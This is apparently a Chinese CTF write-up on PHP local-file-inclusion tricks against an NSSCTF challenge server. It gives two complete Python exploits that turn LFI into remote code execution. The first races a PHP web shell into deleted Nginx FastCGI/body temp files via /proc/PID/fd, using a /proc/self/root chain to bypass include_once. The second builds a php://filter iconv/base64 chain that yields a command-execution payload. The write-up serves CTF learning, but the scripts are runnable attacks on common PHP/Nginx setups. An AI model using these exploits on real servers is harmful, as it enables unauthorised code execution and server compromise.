#### 有关php的一些啸特性-1

1.绕过waf(超过10000次就***）

##### 2.临时目录：

方法一
Nginx+FastCGI+临时文件

前置知识
Nginx 在后端 Fastcgi 响应过大产生临时文件
www-data用户在nginx可写的目录如下

```
/var/lib/nginx/scgi
/var/lib/nginx/body
/var/lib/nginx/uwsgi
/var/lib/nginx/proxy
/var/lib/nginx/fastcgi
/var/log/nginx/access.log
/var/log/nginx/error.log
```

##### 其中发现 /var/lib/nginx/fastcgi 目录是 Nginx 的 http-fastcgi-temp-path，此目录下可以通过nginx产生临时文件，格式为：/var/lib/nginx/fastcgi/x/y/0000000yx

那这临时文件用来干嘛呢？通过阅读 Nginx 文档 fastcgi_buffering 部分
我们大致可以知道Nginx 接收来自 FastCGI 的响应 如果内容过大，那它的一部分就会被存入磁盘上的临时文件，而这个阈值大概在 32KB 左右。超过阈值，就在/var/lib/nginx/fastcgi 下产生了临时文件

但是几乎 Nginx 是创建完文件就立即删除了，也就是说产生临时文件但被删除导致我们无法查看，我们该怎么解决呢，解决办法如下

#### 竞争包含
如果打开一个进程打开了某个文件，某个文件就会出现在`` /proc/PID/fd/``目录下，但是如果这个文件在没有被关闭的情况下就被删除了呢？这种情况下我们还是可以在对应的 /proc/PID/fd 下找到我们删除的文件 ，虽然显示是被删除了，但是我们依然可以读取到文件内容，所以我们可以直接用php 进行文件包含。

所以到这里我们可以有了一个大概的想法：竞争包含 proc 目录下的临时文件。但是最后一个问题就是，既然我们要去包含 Nginx 进程下的文件，我们就需要知道对应的 pid 以及 fd 下具体的文件名，怎么才能获取到这些信息呢？

这时我们就需要用到文件读取进行获取 proc 目录下的其他文件了，这里我们只需要本地搭个 Nginx 进程并启动，对比其进程的 proc 目录文件与其他进程文件区别就可以了。

而进程间比较容易区别的就是通过`` /proc/cmdline`` ，如果是 Nginx Worker 进程，我们可以读取到文件内容为 ``nginx: worker process`` 即可找到 Nginx Worker 进程；因为 Master 进程不处理请求，所以我们没必要找 Nginx Master 进程。

当然，Nginx 会有很多 Worker 进程，但是一般来说 Worker 数量不会超过 cpu 核心数量，我们可以通过 /proc/cpuinfo 中的 processor 个数得到 cpu 数量，我们可以对比找到的 Nginx Worker Pid 数量以及 CPU 数量来校验我们大概找的对不对。

那怎么确定用哪一个 PID 呢？以及 fd 怎么办呢？由于 Nginx 的调度策略我们确实没有办法确定具体哪一个 worker 分配了任务，但是一般来说是 8 个 worker ，实际本地测试 fd 序号一般不超过 70 ，即使爆破也只是 8*70 ，能在常数时间内得到解答。

绕过include_once限制
参考文章
利用/proc/self/root/是指向/的符号链接

``f = f'/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/{pid}/fd/{fd}'``
或者

``f = f'/proc/xxx/xxx/xxx/../../../{pid}/fd/{fd}'``
解题过程

``index.php``

````
<?php ($_GET['action'] ?? 'read' ) === 'read' ? readfile($_GET['file'] ?? 'index.php') : include_once($_GET['file'] ?? 'index.php');
````

($_GET['action'] ?? 'read')：这一部分首先尝试从 URL 查询参数中获取名为 ‘action’的参数值($_GET['action'])，如果该参数不存在，则使用默认值 ‘read’。这是通过使用 PHP 7 中的空合并运算符?? 来实现的，它会检查左侧的表达式是否为 null，如果是则使用右侧的默认值。

=== 'read'：这是一个相等性比较，它检查上述表达式的结果是否严格等于字符串 ‘read’。如果是 ‘read’，则条件为真，否则条件为假。

``? readfile($_GET['file'] ?? 'index.php') : include_once($_GET['file'] ?? 'index.php');``：这是一个三元条件运算符，根据前面的条件表达式的结果来执行不同的操作。

如果条件为真（即 ‘action’ 参数等于 ‘read’），则执行 readfile($_GET['file'] ?? 'index.php')，它会读取并输出指定文件的内容。如果 URL 中没有 ‘file’ 参数，它会默认读取 ‘index.php’ 文件的内容。

如果条件为假（即 ‘action’ 参数不等于 ‘read’），则执行 include_once($_GET['file'] ?? 'index.php')，它会包含指定的文件。同样，如果 URL 中没有 ‘file’ 参数，它会默认包含 ‘index.php’ 文件。

我们看向dockerfile，发现并没有权限写临时文件

但是我们往下翻，有一处hint
让我们找到可写的目录

也就是前置知识所提到的``/var/lib/nginx/fastcgi``
然后绕过include_once()，找到pid和fd即可

整理一下思路：

让后端 php 请求一个过大的文件
Fastcgi 返回响应包过大，导致 Nginx 需要产生临时文件进行缓存
虽然 Nginx 删除了/var/lib/nginx/fastcgi下的临时文件，但是在 /proc/pid/fd/ 下我们可以找到被删除的文件
遍历 pid 以及 fd ，使用多重链接绕过 PHP 包含策略完成 LFI
脚本如下
````python
#!/usr/bin/env python3
import sys, threading, requests

# exploit PHP local file inclusion (LFI) via nginx's client body buffering assistance
# see https://bierbaumer.net/security/php-lfi-with-nginx-assistance/ for details

# ./xxx.py ip port
# URL = f'http://{sys.argv[1]}:{sys.argv[2]}/'
URL = "http://node4.anna.nssctf.cn:28338/"

# find nginx worker processes
r  = requests.get(URL, params={
    'file': '/proc/cpuinfo'
})
cpus = r.text.count('processor')

r  = requests.get(URL, params={
    'file': '/proc/sys/kernel/pid_max'
})
pid_max = int(r.text)
print(f'[*] cpus: {cpus}; pid_max: {pid_max}')

nginx_workers = []
for pid in range(pid_max):
    r  = requests.get(URL, params={
        'file': f'/proc/{pid}/cmdline'
    })

    if b'nginx: worker process' in r.content:
        print(f'[*] nginx worker found: {pid}')

        nginx_workers.append(pid)
        if len(nginx_workers) >= cpus:
            break

done = False

# upload a big client body to force nginx to create a /var/lib/nginx/body/$X
def uploader():
    print('[+] starting uploader')
    while not done:
        requests.get(URL, data='<?php system($_GET[\'cmd\']); /*' + 16*1024*'A')

for _ in range(16):
    t = threading.Thread(target=uploader)
    t.start()

# brute force nginx's fds to include body files via procfs
# use ../../ to bypass include's readlink / stat problems with resolving fds to `/var/lib/nginx/body/0000001150 (deleted)`
def bruter(pid):
    global done

    while not done:
        print(f'[+] brute loop restarted: {pid}')
        for fd in range(4, 32):
            f = f'/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/{pid}/fd/{fd}'
            r  = requests.get(URL, params={
                'file': f,
                'cmd': f'/readflag',   #命令，如ls
                'action':'1'   #这题要加这个，原脚本没加
            })
            if r.text:
                print(f'[!] {f}: {r.text}')
                done = True
                exit()

for pid in nginx_workers:
    a = threading.Thread(target=bruter, args=(pid, ))
    a.start()


得到flag



````

#### 方法二
前置知识
Base64 Filter 宽松解析+iconv filter
参考文章
这个方法被誉为PHP本地文件包含（LFI）的尽头
原理：

大概就是对PHP Base64 Filter来说，会忽略掉非正常编码的字符。这很好理解，有些奇怪的字符串进行base64解码再编码后会发现和初始的不一样，就是这个原因

脚本如下

````
import requests

url = "http://node4.anna.nssctf.cn:28627/"
file_to_use = "/etc/passwd"
command = "/readflag"

#两个分号避开了最终 base64 编码中的斜杠
#<?=`$_GET[0]`;;?>
base64_payload = "PD89YCRfR0VUWzBdYDs7Pz4"

conversions = {
    'R': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2',
    'B': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2',
    'C': 'convert.iconv.UTF8.CSISO2022KR',
    '8': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2',
    '9': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB',
    'f': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213',
    's': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61',
    'z': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS',
    'U': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932',
    'P': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213',
    'V': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5',
    '0': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2',
    'Y': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2',
    'W': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2',
    'd': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2',
    'D': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2',
    '7': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2',
    '4': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2'
}


# generate some garbage base64

filters = "convert.iconv.UTF8.CSISO2022KR|"
filters += "convert.base64-encode|"

# make sure to get rid of any equal signs in both the string we just generated and the rest of the file

filters += "convert.iconv.UTF8.UTF7|"


for c in base64_payload[::-1]:
        filters += conversions[c] + "|"
        # decode and reencode to get rid of everything that isn't valid base64
        filters += "convert.base64-decode|"
        filters += "convert.base64-encode|"
        # get rid of equal signs
        filters += "convert.iconv.UTF8.UTF7|"

filters += "convert.base64-decode"

final_payload = f"php://filter/{filters}/resource={file_to_use}"

r = requests.get(url, params={
    "0": command,
    "file": final_payload
})

# print(filters)

# print(final_payload)

print(r.text)


r = requests.get(url, params={
    "0": command,
    "action": "xxx",
    "file": final_payload
})
得到flag
````

````解题过程
只需要稍微修改下脚本添加action参数即可
````

##### 3.协议容错(好像没啥用。。。)

经过测试，一些错误会回滚。。。

如：?data=php://fliter.read/base64-encode/read=example.php 

?data=php://fliter.read/base64encode/read6=example.php相当于包含了example.php

